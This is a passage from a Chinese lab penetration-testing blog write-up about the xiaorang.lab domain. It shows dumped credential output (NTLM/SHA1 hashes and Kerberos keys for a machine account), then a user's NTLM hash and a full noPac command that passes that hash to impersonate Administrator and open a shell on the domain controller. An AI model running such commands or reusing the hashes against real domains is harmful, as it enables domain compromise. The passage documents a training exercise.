+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>         * NTLM     : ab4d54dc9ba1a18ea53849a213048677
+</span></span><span class=line><span class=cl>         * SHA1     : 33f9d2fbd7c5e6a5534ce8745cc928f670888cd7
+</span></span><span class=line><span class=cl>        tspkg :
+</span></span><span class=line><span class=cl>        wdigest :
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>         * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>        kerberos :
+</span></span><span class=line><span class=cl>         * Username : xr-lcm3ae8b$
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG.LAB
+</span></span><span class=line><span class=cl>         * Password : cc fd 8b <span class=m>63</span> a9 ef d1 f3 c3 1d <span class=m>70</span> 1d 1e 3e d7 <span class=m>66</span> bf <span class=m>28</span> d2 <span class=m>31</span> 6c <span class=m>27</span> 5d <span class=m>52</span> <span class=m>38</span> <span class=m>75</span> <span class=m>01</span> f2 b1 9c 5b 7c <span class=m>58</span> ea <span class=m>39</span> b3 <span class=m>80</span> d0 <span class=m>45</span> <span class=m>41</span> 2f e1 <span class=m>16</span> d3 <span class=m>31</span> <span class=m>98</span> 7d <span class=m>81</span> c7 7f <span class=m>67</span> d1 <span class=m>16</span> a4 0e 7e 7c d8 a4 <span class=m>85</span> c8 <span class=m>62</span> <span class=m>72</span> <span class=m>20</span> 0d <span class=m>96</span> <span class=m>79</span> 4f 7a <span class=m>17</span> e3 a7 b8 bf <span class=m>30</span> a1 1d b1 1f ff e2 <span class=m>19</span> bf a5 <span class=m>47</span> be <span class=m>74</span> 3a 4f <span class=m>31</span> <span class=m>01</span> e5 da ad d7 1a 5e <span class=m>46</span> <span class=m>21</span> 0b <span class=m>13</span> <span class=m>65</span> <span class=m>82</span> <span class=m>10</span> ed <span class=m>26</span> d3 b4 c6 6e e8 <span class=m>91</span> <span class=m>34</span> <span class=m>80</span> <span class=m>18</span> ee <span class=m>78</span> 5c e5 6e <span class=m>06</span> e6 <span class=m>42</span> 5b <span class=m>00</span> <span class=m>75</span> <span class=m>10</span> <span class=m>26</span> <span class=m>92</span> 1b 7a <span class=m>15</span> <span class=m>28</span> 9b <span class=m>67</span> <span class=m>18</span> <span class=m>56</span> <span class=m>95</span> d1 d7 <span class=m>13</span> 5f 1e <span class=m>85</span> <span class=m>50</span> 1b ed <span class=m>28</span> f5 f4 <span class=m>14</span> <span class=m>01</span> dd <span class=m>62</span> b9 d6 f2 0a 4e 0e 7d 8a <span class=m>15</span> 5d <span class=m>06</span> <span class=m>63</span> <span class=m>00</span> <span class=m>25</span> e9 <span class=m>57</span> b9 b2 4e <span class=m>73</span> b9 ce <span class=m>29</span> <span class=m>35</span> ac 0e 9c <span class=m>57</span> <span class=m>02</span> <span class=m>51</span> cf <span class=m>65</span> bc <span class=m>29</span> 9f 6c <span class=m>70</span> <span class=m>60</span> 2b <span class=m>15</span> <span class=m>43</span> <span class=m>98</span> 6a 6c 3b f1 <span class=m>00</span> 5c 7e <span class=m>62</span> ec <span class=m>51</span> 7a <span class=m>30</span> <span class=m>19</span> <span class=m>55</span> 0f ab c4 0d 2f 5c <span class=m>98</span> <span class=m>65</span> <span class=m>01</span> 1a 6e 9a a4 c7 2b 4d be <span class=m>79</span> <span class=m>38</span> 9e d5 8c 0d 8c 5f d0 <span class=m>54</span> 4e <span class=m>11</span> <span class=m>88</span>
+</span></span><span class=line><span class=cl>        ssp :
+</span></span><span class=line><span class=cl>        credman :
+</span></span><span class=line><span class=cl>        cloudap :
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>30838</span> <span class=o>(</span>00000000:00007876<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : Interactive from <span class=m>1</span>
+</span></span><span class=line><span class=cl>User Name         : UMFD-1
+</span></span><span class=line><span class=cl>Domain            : Font Driver Host
+</span></span><span class=line><span class=cl>Logon Server      : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Logon Time        : 2026/8/23 20:30:56
+</span></span><span class=line><span class=cl>SID               : S-1-5-96-0-1
+</span></span><span class=line><span class=cl>        msv :
+</span></span><span class=line><span class=cl>         <span class=o>[</span>00000003<span class=o>]</span> Primary
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>         * NTLM     : ab4d54dc9ba1a18ea53849a213048677
+</span></span><span class=line><span class=cl>         * SHA1     : 33f9d2fbd7c5e6a5534ce8745cc928f670888cd7
+</span></span><span class=line><span class=cl>        tspkg :
+</span></span><span class=line><span class=cl>        wdigest :
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>         * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>        kerberos :
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : xiaorang.lab
+</span></span><span class=line><span class=cl>         * Password : cc fd 8b <span class=m>63</span> a9 ef d1 f3 c3 1d <span class=m>70</span> 1d 1e 3e d7 <span class=m>66</span> bf <span class=m>28</span> d2 <span class=m>31</span> 6c <span class=m>27</span> 5d <span class=m>52</span> <span class=m>38</span> <span class=m>75</span> <span class=m>01</span> f2 b1 9c 5b 7c <span class=m>58</span> ea <span class=m>39</span> b3 <span class=m>80</span> d0 <span class=m>45</span> <span class=m>41</span> 2f e1 <span class=m>16</span> d3 <span class=m>31</span> <span class=m>98</span> 7d <span class=m>81</span> c7 7f <span class=m>67</span> d1 <span class=m>16</span> a4 0e 7e 7c d8 a4 <span class=m>85</span> c8 <span class=m>62</span> <span class=m>72</span> <span class=m>20</span> 0d <span class=m>96</span> <span class=m>79</span> 4f 7a <span class=m>17</span> e3 a7 b8 bf <span class=m>30</span> a1 1d b1 1f ff e2 <span class=m>19</span> bf a5 <span class=m>47</span> be <span class=m>74</span> 3a 4f <span class=m>31</span> <span class=m>01</span> e5 da ad d7 1a 5e <span class=m>46</span> <span class=m>21</span> 0b <span class=m>13</span> <span class=m>65</span> <span class=m>82</span> <span class=m>10</span> ed <span class=m>26</span> d3 b4 c6 6e e8 <span class=m>91</span> <span class=m>34</span> <span class=m>80</span> <span class=m>18</span> ee <span class=m>78</span> 5c e5 6e <span class=m>06</span> e6 <span class=m>42</span> 5b <span class=m>00</span> <span class=m>75</span> <span class=m>10</span> <span class=m>26</span> <span class=m>92</span> 1b 7a <span class=m>15</span> <span class=m>28</span> 9b <span class=m>67</span> <span class=m>18</span> <span class=m>56</span> <span class=m>95</span> d1 d7 <span class=m>13</span> 5f 1e <span class=m>85</span> <span class=m>50</span> 1b ed <span class=m>28</span> f5 f4 <span class=m>14</span> <span class=m>01</span> dd <span class=m>62</span> b9 d6 f2 0a 4e 0e 7d 8a <span class=m>15</span> 5d <span class=m>06</span> <span class=m>63</span> <span class=m>00</span> <span class=m>25</span> e9 <span class=m>57</span> b9 b2 4e <span class=m>73</span> b9 ce <span class=m>29</span> <span class=m>35</span> ac 0e 9c <span class=m>57</span> <span class=m>02</span> <span class=m>51</span> cf <span class=m>65</span> bc <span class=m>29</span> 9f 6c <span class=m>70</span> <span class=m>60</span> 2b <span class=m>15</span> <span class=m>43</span> <span class=m>98</span> 6a 6c 3b f1 <span class=m>00</span> 5c 7e <span class=m>62</span> ec <span class=m>51</span> 7a <span class=m>30</span> <span class=m>19</span> <span class=m>55</span> 0f ab c4 0d 2f 5c <span class=m>98</span> <span class=m>65</span> <span class=m>01</span> 1a 6e 9a a4 c7 2b 4d be <span class=m>79</span> <span class=m>38</span> 9e d5 8c 0d 8c 5f d0 <span class=m>54</span> 4e <span class=m>11</span> <span class=m>88</span>
+</span></span><span class=line><span class=cl>        ssp :
+</span></span><span class=line><span class=cl>        credman :
+</span></span><span class=line><span class=cl>        cloudap :
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>30797</span> <span class=o>(</span>00000000:0000784d<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : Interactive from <span class=m>0</span>
+</span></span><span class=line><span class=cl>User Name         : UMFD-0
+</span></span><span class=line><span class=cl>Domain            : Font Driver Host
+</span></span><span class=line><span class=cl>Logon Server      : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Logon Time        : 2026/8/23 20:30:56
+</span></span><span class=line><span class=cl>SID               : S-1-5-96-0-0
+</span></span><span class=line><span class=cl>        msv :
+</span></span><span class=line><span class=cl>         <span class=o>[</span>00000003<span class=o>]</span> Primary
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>         * NTLM     : ab4d54dc9ba1a18ea53849a213048677
+</span></span><span class=line><span class=cl>         * SHA1     : 33f9d2fbd7c5e6a5534ce8745cc928f670888cd7
+</span></span><span class=line><span class=cl>        tspkg :
+</span></span><span class=line><span class=cl>        wdigest :
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>         * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>        kerberos :
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : xiaorang.lab
+</span></span><span class=line><span class=cl>         * Password : cc fd 8b <span class=m>63</span> a9 ef d1 f3 c3 1d <span class=m>70</span> 1d 1e 3e d7 <span class=m>66</span> bf <span class=m>28</span> d2 <span class=m>31</span> 6c <span class=m>27</span> 5d <span class=m>52</span> <span class=m>38</span> <span class=m>75</span> <span class=m>01</span> f2 b1 9c 5b 7c <span class=m>58</span> ea <span class=m>39</span> b3 <span class=m>80</span> d0 <span class=m>45</span> <span class=m>41</span> 2f e1 <span class=m>16</span> d3 <span class=m>31</span> <span class=m>98</span> 7d <span class=m>81</span> c7 7f <span class=m>67</span> d1 <span class=m>16</span> a4 0e 7e 7c d8 a4 <span class=m>85</span> c8 <span class=m>62</span> <span class=m>72</span> <span class=m>20</span> 0d <span class=m>96</span> <span class=m>79</span> 4f 7a <span class=m>17</span> e3 a7 b8 bf <span class=m>30</span> a1 1d b1 1f ff e2 <span class=m>19</span> bf a5 <span class=m>47</span> be <span class=m>74</span> 3a 4f <span class=m>31</span> <span class=m>01</span> e5 da ad d7 1a 5e <span class=m>46</span> <span class=m>21</span> 0b <span class=m>13</span> <span class=m>65</span> <span class=m>82</span> <span class=m>10</span> ed <span class=m>26</span> d3 b4 c6 6e e8 <span class=m>91</span> <span class=m>34</span> <span class=m>80</span> <span class=m>18</span> ee <span class=m>78</span> 5c e5 6e <span class=m>06</span> e6 <span class=m>42</span> 5b <span class=m>00</span> <span class=m>75</span> <span class=m>10</span> <span class=m>26</span> <span class=m>92</span> 1b 7a <span class=m>15</span> <span class=m>28</span> 9b <span class=m>67</span> <span class=m>18</span> <span class=m>56</span> <span class=m>95</span> d1 d7 <span class=m>13</span> 5f 1e <span class=m>85</span> <span class=m>50</span> 1b ed <span class=m>28</span> f5 f4 <span class=m>14</span> <span class=m>01</span> dd <span class=m>62</span> b9 d6 f2 0a 4e 0e 7d 8a <span class=m>15</span> 5d <span class=m>06</span> <span class=m>63</span> <span class=m>00</span> <span class=m>25</span> e9 <span class=m>57</span> b9 b2 4e <span class=m>73</span> b9 ce <span class=m>29</span> <span class=m>35</span> ac 0e 9c <span class=m>57</span> <span class=m>02</span> <span class=m>51</span> cf <span class=m>65</span> bc <span class=m>29</span> 9f 6c <span class=m>70</span> <span class=m>60</span> 2b <span class=m>15</span> <span class=m>43</span> <span class=m>98</span> 6a 6c 3b f1 <span class=m>00</span> 5c 7e <span class=m>62</span> ec <span class=m>51</span> 7a <span class=m>30</span> <span class=m>19</span> <span class=m>55</span> 0f ab c4 0d 2f 5c <span class=m>98</span> <span class=m>65</span> <span class=m>01</span> 1a 6e 9a a4 c7 2b 4d be <span class=m>79</span> <span class=m>38</span> 9e d5 8c 0d 8c 5f d0 <span class=m>54</span> 4e <span class=m>11</span> <span class=m>88</span>
+</span></span><span class=line><span class=cl>        ssp :
+</span></span><span class=line><span class=cl>        credman :
+</span></span><span class=line><span class=cl>        cloudap :
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>29639</span> <span class=o>(</span>00000000:000073c7<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : UndefinedLogonType from <span class=m>0</span>
+</span></span><span class=line><span class=cl>User Name         : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Domain            : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Logon Server      : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Logon Time        : 2026/8/23 20:30:56
+</span></span><span class=line><span class=cl>SID               :
+</span></span><span class=line><span class=cl>        msv :
+</span></span><span class=line><span class=cl>         <span class=o>[</span>00000003<span class=o>]</span> Primary
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>         * NTLM     : ab4d54dc9ba1a18ea53849a213048677
+</span></span><span class=line><span class=cl>         * SHA1     : 33f9d2fbd7c5e6a5534ce8745cc928f670888cd7
+</span></span><span class=line><span class=cl>        tspkg :
+</span></span><span class=line><span class=cl>        wdigest :
+</span></span><span class=line><span class=cl>        kerberos :
+</span></span><span class=line><span class=cl>        ssp :
+</span></span><span class=line><span class=cl>        credman :
+</span></span><span class=line><span class=cl>        cloudap :
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>999</span> <span class=o>(</span>00000000:000003e7<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : UndefinedLogonType from <span class=m>0</span>
+</span></span><span class=line><span class=cl>User Name         : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>Domain            : XIAORANG
+</span></span><span class=line><span class=cl>Logon Server      : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Logon Time        : 2026/8/23 20:30:56
+</span></span><span class=line><span class=cl>SID               : S-1-5-18
+</span></span><span class=line><span class=cl>        msv :
+</span></span><span class=line><span class=cl>        tspkg :
+</span></span><span class=line><span class=cl>        wdigest :
+</span></span><span class=line><span class=cl>         * Username : XR-LCM3AE8B$
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>         * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>        kerberos :
+</span></span><span class=line><span class=cl>         * Username : xr-lcm3ae8b$
+</span></span><span class=line><span class=cl>         * Domain   : XIAORANG.LAB
+</span></span><span class=line><span class=cl>         * Password : cc fd 8b <span class=m>63</span> a9 ef d1 f3 c3 1d <span class=m>70</span> 1d 1e 3e d7 <span class=m>66</span> bf <span class=m>28</span> d2 <span class=m>31</span> 6c <span class=m>27</span> 5d <span class=m>52</span> <span class=m>38</span> <span class=m>75</span> <span class=m>01</span> f2 b1 9c 5b 7c <span class=m>58</span> ea <span class=m>39</span> b3 <span class=m>80</span> d0 <span class=m>45</span> <span class=m>41</span> 2f e1 <span class=m>16</span> d3 <span class=m>31</span> <span class=m>98</span> 7d <span class=m>81</span> c7 7f <span class=m>67</span> d1 <span class=m>16</span> a4 0e 7e 7c d8 a4 <span class=m>85</span> c8 <span class=m>62</span> <span class=m>72</span> <span class=m>20</span> 0d <span class=m>96</span> <span class=m>79</span> 4f 7a <span class=m>17</span> e3 a7 b8 bf <span class=m>30</span> a1 1d b1 1f ff e2 <span class=m>19</span> bf a5 <span class=m>47</span> be <span class=m>74</span> 3a 4f <span class=m>31</span> <span class=m>01</span> e5 da ad d7 1a 5e <span class=m>46</span> <span class=m>21</span> 0b <span class=m>13</span> <span class=m>65</span> <span class=m>82</span> <span class=m>10</span> ed <span class=m>26</span> d3 b4 c6 6e e8 <span class=m>91</span> <span class=m>34</span> <span class=m>80</span> <span class=m>18</span> ee <span class=m>78</span> 5c e5 6e <span class=m>06</span> e6 <span class=m>42</span> 5b <span class=m>00</span> <span class=m>75</span> <span class=m>10</span> <span class=m>26</span> <span class=m>92</span> 1b 7a <span class=m>15</span> <span class=m>28</span> 9b <span class=m>67</span> <span class=m>18</span> <span class=m>56</span> <span class=m>95</span> d1 d7 <span class=m>13</span> 5f 1e <span class=m>85</span> <span class=m>50</span> 1b ed <span class=m>28</span> f5 f4 <span class=m>14</span> <span class=m>01</span> dd <span class=m>62</span> b9 d6 f2 0a 4e 0e 7d 8a <span class=m>15</span> 5d <span class=m>06</span> <span class=m>63</span> <span class=m>00</span> <span class=m>25</span> e9 <span class=m>57</span> b9 b2 4e <span class=m>73</span> b9 ce <span class=m>29</span> <span class=m>35</span> ac 0e 9c <span class=m>57</span> <span class=m>02</span> <span class=m>51</span> cf <span class=m>65</span> bc <span class=m>29</span> 9f 6c <span class=m>70</span> <span class=m>60</span> 2b <span class=m>15</span> <span class=m>43</span> <span class=m>98</span> 6a 6c 3b f1 <span class=m>00</span> 5c 7e <span class=m>62</span> ec <span class=m>51</span> 7a <span class=m>30</span> <span class=m>19</span> <span class=m>55</span> 0f ab c4 0d 2f 5c <span class=m>98</span> <span class=m>65</span> <span class=m>01</span> 1a 6e 9a a4 c7 2b 4d be <span class=m>79</span> <span class=m>38</span> 9e d5 8c 0d 8c 5f d0 <span class=m>54</span> 4e <span class=m>11</span> <span class=m>88</span>
+</span></span><span class=line><span class=cl>        ssp :
+</span></span><span class=line><span class=cl>        credman :
+</span></span><span class=line><span class=cl>        cloudap :
+</span></span></code></pre></td></tr></table></div></div><p>可以抓到一个zhanghui用户的哈希1232126b24cdf8c9bd2f788a9d7c7ed1，他在MA_Admin组，对computer能够创建对象，能向域中添加机器账户，所以能打<a class=link href=https://github.com/Ridter/noPac target=_blank rel=noopener>noPac</a></p><p><img src=/p/spoofing/image-20260823233116704_hu_b1910e3c6cdcea72.webp width=597 height=209 srcset="/p/spoofing/image-20260823233116704_hu_89056f28043f7f45.webp 480w, /p/spoofing/image-20260823233116704_hu_b1910e3c6cdcea72.webp 597w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/spoofing/image-20260823233116704_hu_b1910e3c6cdcea72.webp data-full-width=597 data-full-height=209 loading=lazy decoding=async alt=image-20260823233116704 class=gallery-image data-flex-grow=285 data-flex-basis=685px></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>proxychains4 python3 noPac.py xiaorang.lab/zhanghui -hashes <span class=s1>&#39;:1232126b24cdf8c9bd2f788a9d7c7ed1&#39;</span> -dc-ip 172.22.11.6 --impersonate Administrator -create-child -use-ldap -shell
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/spoofing/image-20260823233915586_hu_21bb649a3c3ebbfb.webp width=859 height=755 srcset="/p/spoofing/image-20260823233915586_hu_128abc55fe66b772.webp 480w, /p/spoofing/image-20260823233915586_hu_21bb649a3c3ebbfb.webp 859w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/spoofing/image-20260823233915586_hu_21bb649a3c3ebbfb.webp data-full-width=859 data-full-height=755 loading=lazy decoding=async alt=image-20260823233915586 class=gallery-image data-flex-grow=113 data-flex-basis=273px></p></section><footer class=article-footer><section class=article-tags><a href=/tags/%E6%89%93%E9%9D%B6/>打靶</a>
+<a href=/tags/%E6%B8%97%E9%80%8F/>渗透</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under 9u_l3</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/delivery/><div class=article-image><img src=/p/delivery/1_hu_dcac29803b407376.5fb9174fa9ed073ef10d9a95ad0dfd1e.webp width=250 height=150 loading=lazy decoding=async alt=文章封面：Delivery data-hash="md5-X7kXT6ntBz7xDZqVrQ39Hg=="></div><div class=article-details><h2 class=article-title>Delivery</h2></div></a></article><article class=has-image><a href=/p/privilege/><div class=article-image><img src=/p/privilege/1_hu_dcac29803b407376.5fb9174fa9ed073ef10d9a95ad0dfd1e.webp width=250 height=150 loading=lazy decoding=async alt=文章封面：Privilege data-hash="md5-X7kXT6ntBz7xDZqVrQ39Hg=="></div><div class=article-details><h2 class=article-title>Privilege</h2></div></a></article><article class=has-image><a href=/p/rivulet/><div class=article-image><img src=/p/rivulet/1_hu_dcac29803b407376.5fb9174fa9ed073ef10d9a95ad0dfd1e.webp width=250 height=150 loading=lazy decoding=async alt=文章封面：Rivulet data-hash="md5-X7kXT6ntBz7xDZqVrQ39Hg=="></div><div class=article-details><h2 class=article-title>Rivulet</h2></div></a></article><article class=has-image><a href=/p/hospital/><div class=article-image><img src=/p/hospital/1_hu_dcac29803b407376.5fb9174fa9ed073ef10d9a95ad0dfd1e.webp width=250 height=150 loading=lazy decoding=async alt=文章封面：Hospital data-hash="md5-X7kXT6ntBz7xDZqVrQ39Hg=="></div><div class=article-details><h2 class=article-title>Hospital</h2></div></a></article><article class=has-image><a href=/p/certify/><div class=article-image><img src=/p/certify/1_hu_dcac29803b407376.5fb9174fa9ed073ef10d9a95ad0dfd1e.webp width=250 height=150 loading=lazy decoding=async alt=文章封面：Certify data-hash="md5-X7kXT6ntBz7xDZqVrQ39Hg=="></div><div class=article-details><h2 class=article-title>Certify</h2></div></a></article></div></div></aside><script src=//unpkg.com/@waline/client@v2/dist/waline.js></script><link href=//unpkg.com/@waline/client@v2/dist/waline.css rel=stylesheet><div id=waline class=waline-container></div><style>.waline-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding);--waline-font-size:var(--article-font-size)}.waline-container .wl-count{color:var(--card-text-color-main)}</style><script>Waline.init({dark:'html[data-scheme="dark"]',el:"#waline",emoji:["https://unpkg.com/@waline/emojis@1.0.1/weibo"],locale:{admin:"Admin",placeholder:null},requiredMeta:["name","email","url"],serverURL:"https://waline-test-one-smoky.vercel.app"})</script><footer class=site-footer><section class=copyright>&copy;
+2025 -
+2026 无敌可爱美咕噜</section><section class=powerby>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c1359695076787b3e6c2c57e9020904701cc696d5767c0ab1e455ca7031aae69.js defer></script><script type=text/javascript src=/ts/custom.21fb9193a315382e5c9cc70d4be76a78390116b15319b875de205795ecf99ac9.js defer></script><script>const cdnPath="https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@f09405fd",cssPath="https://0d000721999.github.io/waifu/waifu.css",config={path:{homePath:"/",modelPath:cdnPath+"/Resources/",cssPath,tipsJsonPath:cdnPath+"/waifu-tips.json",tipsJsPath:cdnPath+"/waifu-tips.js",live2dCorePath:cdnPath+"/Core/live2dcubismcore.js",live2dSdkPath:cdnPath+"/live2d-sdk.js"},tools:["hitokoto","asteroids","express","photo","quit"],drag:{enable:!0,direction:["x","y"]},switchType:"order"};screen.width>=768&&Promise.all([loadExternalResource(config.path.cssPath,"css"),loadExternalResource(config.path.live2dCorePath,"js"),loadExternalResource(config.path.live2dSdkPath,"js"),loadExternalResource(config.path.tipsJsPath,"js")]).then(()=>{initWidget({waifuPath:config.path.tipsJsonPath,cdnPath:config.path.modelPath,tools:config.tools,dragEnable:config.drag.enable,dragDirection:config.drag.direction,switchType:config.switchType})});function loadExternalResource(e,t){return new Promise((n,s)=>{let o;t==="css"?(o=document.createElement("link"),o.rel="stylesheet",o.href=e):t==="js"&&(o=document.createElement("script"),o.src=e),o&&(o.onload=()=>n(e),o.onerror=()=>s(e),document.head.appendChild(o))})}</script></body></html>
